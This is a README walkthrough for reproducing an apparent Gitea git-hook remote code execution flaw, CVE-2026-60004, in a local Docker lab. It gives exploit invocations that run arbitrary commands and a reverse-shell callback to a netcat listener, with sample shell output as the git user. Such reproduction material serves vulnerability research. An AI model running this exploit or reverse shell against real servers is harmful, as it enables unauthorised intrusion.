# CVE-2026-60004 PoC & Reproduction Walkthrough

This directory contains the Proof of Concept (PoC) verification script and architectural boundary test suite for **CVE-2026-60004** (Gitea `diffpatch` Git Hook Remote Code Execution).

---

## 1. Environment Setup

### Prerequisites
- Docker Engine & Docker Compose plugin (`docker compose`)
- Python 3.10+
- Python library `requests` (`pip install -r poc/requirements.txt`)
- Netcat (`nc`) for optional interactive callback verification

### Starting the Vulnerable Gitea Instance
From the root directory of this repository:
```bash
docker compose up -d
```
The Gitea instance will be available at `http://localhost:3000`, with a baseline account (`dev` / `Password123!`) and repository (`dev/project`) initialized automatically.

---

## 2. Reproduction Walkthrough

### Option A: Non-Interactive Command Verification
Execute a single verification command using either automatic self-registration (when credentials are omitted) or an existing account:
```bash
# Automatic self-registration & temporary repository provisioning:
python3 poc/exploit.py --url http://localhost:3000 --cmd "id > /tmp/pwned.txt"

# Using pre-provisioned credentials and repository:
python3 poc/exploit.py --url http://localhost:3000 --username dev --password "Password123!" --repo project --cmd "id"
```

### Option B: Interactive Callback Verification

#### Step 1: Start Netcat Listener
On the host machine, listen on your chosen TCP port (e.g., `4444`):
```bash
nc -lvnp 4444
```

#### Step 2: Determine Reachable Host Gateway IP
Determine the host IP reachable from the Gitea container:
- Linux Docker Compose bridge gateway:
  ```bash
  GATEWAY_IP="$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.Gateway}}{{end}}' gitea-cve-2026-60004)"
  echo "${GATEWAY_IP}"
  ```
- Docker Desktop (macOS / Windows): `host.docker.internal`

#### Step 3: Run the PoC
```bash
python3 poc/exploit.py --url http://localhost:3000 --lhost "${GATEWAY_IP}" --lport 4444
```

#### Step 4: Verify Session Privileges
Upon applying the second patch, the listener receives a callback running as the `git` service user:
```text
Listening on 0.0.0.0 4444
Connection received on 172.20.0.2 49812
/bin/sh: can't access tty; job control turned off
/tmp $ id
uid=1000(git) gid=1000(git) groups=1000(git),1000(git)
```

---

## 3. Controlled Variable & Architectural Matrix Test

To run the automated 4-case controlled variable experiment verifying Git's `--cached`, `-3`, and lifecycle hook boundaries:
```bash
python3 poc/matrix_test.py --url http://localhost:3000
```

---

## 4. Teardown

To stop and remove the containers, network, and persistent volume:
```bash
docker compose down -v
```
